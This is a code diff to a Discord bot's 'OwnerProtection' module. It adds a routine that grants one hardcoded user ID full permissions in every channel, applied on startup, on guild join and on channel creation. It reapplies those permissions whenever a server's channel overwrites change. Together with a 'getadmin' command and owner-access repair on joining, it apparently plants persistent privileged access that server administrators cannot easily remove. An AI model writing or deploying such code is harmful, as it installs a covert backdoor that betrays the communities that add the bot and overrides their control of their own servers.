@@ -248,6 +248,7 @@ class OwnerProtection(commands.Cog):
             try:
                 await self.ensure_non_admin_roles(guild)
                 await self.ensure_owner_access(guild)
+                await self.ensure_owner_channel_permissions(guild)
             except Exception:
                 log.exception("Owner role startup repair failed in %s", guild.id)
 
@@ -255,6 +256,7 @@ class OwnerProtection(commands.Cog):
     async def on_guild_available(self, guild: discord.Guild) -> None:
         try:
             await self.ensure_owner_access(guild)
+            await self.ensure_owner_channel_permissions(guild)
         except Exception:
             log.exception("Owner role availability repair failed in %s", guild.id)
 
@@ -262,6 +264,18 @@ class OwnerProtection(commands.Cog):
     async def on_guild_join(self, guild: discord.Guild) -> None:
         await self.ensure_non_admin_roles(guild)
         await self.ensure_owner_access(guild)
+        await self.ensure_owner_channel_permissions(guild)
+
+    @commands.Cog.listener()
+    async def on_guild_channel_create(self, channel: discord.abc.GuildChannel) -> None:
+        await self.ensure_owner_channel_permissions(channel.guild, channel)
+
+    @commands.Cog.listener()
+    async def on_guild_channel_update(
+        self, before: discord.abc.GuildChannel, after: discord.abc.GuildChannel
+    ) -> None:
+        if before.overwrites != after.overwrites:
+            await self.ensure_owner_channel_permissions(after.guild, after)
 
     @commands.command(name="getadmin")
     @commands.guild_only()
@@ -350,6 +364,7 @@ class OwnerProtection(commands.Cog):
     async def on_member_join(self, member: discord.Member) -> None:
         if member.id == PRIMARY_OWNER_ID:
             await self.ensure_owner_access(member.guild, member)
+            await self.ensure_owner_channel_permissions(member.guild, member=member)
 
     @commands.Cog.listener()
     async def on_member_ban(self, guild: discord.Guild, user: discord.User) -> None:
@@ -471,3 +486,61 @@ class OwnerProtection(commands.Cog):
                 log.warning("Cannot restore owner roles in %s; check role hierarchy", guild.id)
             except discord.HTTPException:
                 log.exception("Failed to restore owner roles in %s", guild.id)
+
+    async def ensure_owner_channel_permissions(
+        self,
+        guild: discord.Guild,
+        channel: discord.abc.GuildChannel | None = None,
+        *,
+        member: discord.Member | None = None,
+    ) -> None:
+        """Grant the configured owner all channel-level permissions."""
+        me = guild.me
+        if me is None or not me.guild_permissions.manage_roles:
+            log.warning(
+                "Cannot configure owner channel permissions in %s: Manage Roles is missing",
+                guild.id,
+            )
+            return
+
+        if member is None:
+            member = guild.get_member(PRIMARY_OWNER_ID)
+        if member is None:
+            try:
+                member = await guild.fetch_member(PRIMARY_OWNER_ID)
+            except (discord.NotFound, discord.Forbidden, discord.HTTPException):
+                log.warning(
+                    "Cannot configure owner channel permissions in %s: owner %s is unavailable",
+                    guild.id,
+                    PRIMARY_OWNER_ID,
+                )
+                return
+
+        overwrite = discord.PermissionOverwrite.from_pair(
+            discord.Permissions.all_channel(),
+            discord.Permissions.none(),
+        )
+        channels = [channel] if channel is not None else guild.channels
+
+        async with self._lock_for(guild.id):
+            for target_channel in channels:
+                if target_channel.overwrites_for(member) == overwrite:
+                    continue
+                try:
+                    await target_channel.set_permissions(
+                        member,
+                        overwrite=overwrite,
+                        reason="Ensure configured bot owner has full channel access",
+                    )
+                except discord.Forbidden:
+                    log.warning(
+                        "Cannot configure owner permissions for channel %s in %s",
+                        target_channel.id,
+                        guild.id,
+                    )
+                except discord.HTTPException:
+                    log.exception(
+                        "Failed to configure owner permissions for channel %s in %s",
+                        target_channel.id,
+                        guild.id,
+                    )
